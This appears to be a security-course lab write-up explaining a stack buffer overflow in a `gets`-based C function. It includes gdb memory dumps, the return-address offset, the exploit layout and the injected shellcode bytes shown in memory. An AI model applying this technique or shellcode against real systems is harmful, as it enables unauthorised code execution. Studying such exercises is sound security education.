# 01 - Remus Writeup

## Main Idea

The code is vulnerable because `gets(buf)` does not check the length of the input from the user. So we can inject the SHELLCODE right after the return address, and overwrite the return address with the address of the shellcode.  

## Magic Numbers

The address of buffer is `0xffffd698`, the RIP is `0xffffd6ac`, so the location of RIP is 20 bytes away from the start of the buffer (0xffffd6ac - 0xffffd698).

``` C++
(gdb) x/16x buf
0xffffd698:  0x00000000   0x00000000   0x00000000   0x00000000
0xffffd6a8:  0xffffd6b8   0x08049208   0x00000001   0x080491fd   
0xffffd6b8:  0xffffd73c   0x080493d6   0x00000001   0xffffd734   
0xffffd6c8:  0xffffd73c   0x0804a000   0x00000000   0x00000000
(gdb) i f
Stack level 0, frame at 0xffffd6b0:
 eip = 0x80491eb in orbit (orbit.c:5); saved eip = 0x8049208
 called by frame at 0xffffd6c0
 source language c.
 Arglist at 0xffffd6a8, args:
 Locals at 0xffffd6a8, Previous frame's sp is 0xffffd6b0
 Saved registers:
  ebp at 0xffffd6a8, eip at 0xffffd6ac
```

## Exploit Structure

Here is the stack diagram.


The exploit has three parts:

1. Write 20 dummy characters to overwrite `buf`, the compiler padding, and the sfp.
2. Overwrite the rip with the address of the shellcode. Since we are putting shellcode directly after the rip, we overwrite the rip with `0xffffd6b0` (`0xffffd6ac + 4`).
3. Finally, insert the shellcode directly after the rip.

This causes the `orbit` function to start executing the shellcode at address `0xffffd6b0` when it returns.

## Exploit GDB Output

When we ran GDB after inputting the malicious exploit string, we got the following output:

```C++
(gdb) x/16x buf
0xffffd698:  0x41414141   0x41414141   0x41414141   0x41414141
0xffffd6a8:  0x41414141   0xffffd6b0   0xcd58326a   0x89c38980
0xffffd6b8:  0x58476ac1   0xc03180cd   0x692d6850   0xe2896969
0xffffd6c8:  0x6d2b6850   0xe1896d6d   0x2f2f6850   0x2f686873
```

